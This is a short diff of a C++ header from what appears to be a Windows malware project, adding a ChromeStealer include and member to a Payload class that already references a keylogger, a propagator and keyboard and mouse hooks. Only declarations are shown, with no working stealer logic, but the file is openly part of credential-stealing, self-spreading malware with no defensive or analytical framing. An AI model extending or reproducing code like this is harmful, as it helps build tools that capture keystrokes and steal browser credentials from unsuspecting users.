@@ -5,6 +5,8 @@
 #include "Propagator.h"
 #include "Keylogger.h"
 #include "IPayload.h"
+#include "ChromeStealer.h"
+#include "MouseEvent.h"
 
 #include <Windows.h>
 
@@ -15,6 +17,7 @@ public:
 	static HINSTANCE Instance;
 	static HHOOK KeyboardHook;
 	static HHOOK MouseHook;
+	static ChromeStealer Stealer;
 public:
 	Payload(void);
 	virtual ~Payload(void);
